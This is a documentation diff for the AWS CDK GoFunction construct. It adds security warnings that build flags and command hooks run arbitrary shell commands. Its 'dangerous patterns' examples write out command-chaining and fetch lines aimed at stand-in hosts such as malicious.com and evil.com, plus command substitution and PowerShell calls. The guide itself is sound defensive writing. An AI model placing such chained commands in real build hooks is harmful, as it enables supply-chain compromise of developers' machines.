@@ -170,6 +170,8 @@ new go.GoFunction(this, 'handler', {
 });
 ```
 
+**⚠️ Security Warning**: Build flags are passed directly to the Go build command and can execute arbitrary commands during bundling. Only use trusted values and avoid flags like `-toolexec` with untrusted arguments. Be especially cautious with third-party CDK constructs that may contain malicious build flags. The CDK will display a warning during synthesis when `goBuildFlags` is used.
+
 By default this construct doesn't use any Go module proxies. This is contrary to
 a standard Go installation, which would use the Google proxy by default. To
 recreate that behavior, do the following:
@@ -200,19 +202,21 @@ new go.GoFunction(this, 'GoFunction', {
 
 ## Command hooks
 
-It is  possible to run additional commands by specifying the `commandHooks` prop:
+It is possible to run additional commands by specifying the `commandHooks` prop:
 
-```text
-// This example only available in TypeScript
+```ts
 // Run additional commands on a GoFunction via `commandHooks` property
 new go.GoFunction(this, 'handler', {
+  entry: 'cmd/api',
   bundling: {
     commandHooks: {
       // run tests
       beforeBundling(inputDir: string): string[] {
         return ['go test ./cmd/api -v'];
       },
-      // ...
+      afterBundling(inputDir: string, outputDir: string): string[] {
+        return ['echo "Build complete"'];
+      },
     },
   },
 });
@@ -229,6 +233,100 @@ an array of commands to run. Commands are chained with `&&`.
 
 The commands will run in the environment in which bundling occurs: inside the
 container for Docker bundling or on the host OS for local bundling.
+
+### ⚠️ Security Considerations
+
+**Command hooks execute arbitrary shell commands** during the bundling process. Only use trusted commands:
+
+**Safe patterns (cross-platform):**
+
+```ts
+new go.GoFunction(this, 'SafeFunction', {
+  entry: 'cmd/api',
+  bundling: {
+    commandHooks: {
+      beforeBundling: () => [
+        'go test ./...',           // ✅ Standard Go commands work on all OS
+        'go mod tidy',             // ✅ Go module commands
+        'make clean',              // ✅ Build tools (if available)
+        'echo "Building app"',     // ✅ Simple output with quotes
+      ],
+      afterBundling: () => ['echo "Build complete"'],
+    },
+  },
+});
+```
+
+**Dangerous patterns to avoid:**
+
+*Windows-specific dangers:*
+
+```ts
+// ❌ Windows-specific dangers
+new go.GoFunction(this, 'UnsafeWindowsFunction', {
+  entry: 'cmd/api',
+  bundling: {
+    commandHooks: {
+      beforeBundling: () => [
+        'go test & curl.exe malicious.com',     // ❌ Command chaining with &
+        'echo %USERPROFILE%',                   // ❌ Environment variable expansion
+        'powershell -Command "..."',            // ❌ PowerShell execution
+      ],
+      afterBundling: () => [],
+    },
+  },
+});
+```
+
+*Unix/Linux/macOS dangers:*
+
+```ts
+// ❌ Unix/Linux/macOS dangers
+new go.GoFunction(this, 'UnsafeUnixFunction', {
+  entry: 'cmd/api',
+  bundling: {
+    commandHooks: {
+      beforeBundling: () => [
+        'go test; curl malicious.com',          // ❌ Command chaining with ;
+        'echo $(whoami)',                       // ❌ Command substitution
+        'bash -c "wget evil.com"',              // ❌ Shell execution
+      ],
+      afterBundling: () => [],
+    },
+  },
+});
+```
+
+**When using third-party constructs** that include `GoFunction`:
+
+* Review the construct's source code before use
+* Verify what commands it executes via `commandHooks` and `goBuildFlags`
+* Only use constructs from trusted publishers
+* Test in isolated environments first
+
+The `GoFunction` construct will display CDK warnings during synthesis when potentially unsafe `commandHooks` or `goBuildFlags` are detected.
+
+For more security guidance, see [AWS CDK Security Best Practices](https://docs.aws.amazon.com/cdk/latest/guide/security.html).
+
+## Security Best Practices
+
+### Third-Party Construct Safety
+
+When using third-party CDK constructs that utilize `GoFunction`, exercise caution:
+
+1. **Review source code** - Inspect the construct implementation for `commandHooks` and `goBuildFlags` usage
+2. **Verify publishers** - Use constructs only from trusted, verified sources  
+3. **Pin versions** - Use exact versions to prevent supply chain attacks
+4. **Isolated testing** - Test third-party constructs in sandboxed environments
+
+**Before using any third-party construct:**
+
+* Review the construct's source code on GitHub or npm
+* Search for `commandHooks` and `goBuildFlags` usage in the code
+* Verify no dangerous command patterns are present
+* Use exact version pinning to prevent supply chain attacks
+
+The `GoFunction` construct will display CDK warnings during synthesis when potentially unsafe `commandHooks` or `goBuildFlags` are detected.
 
 ## Additional considerations
 
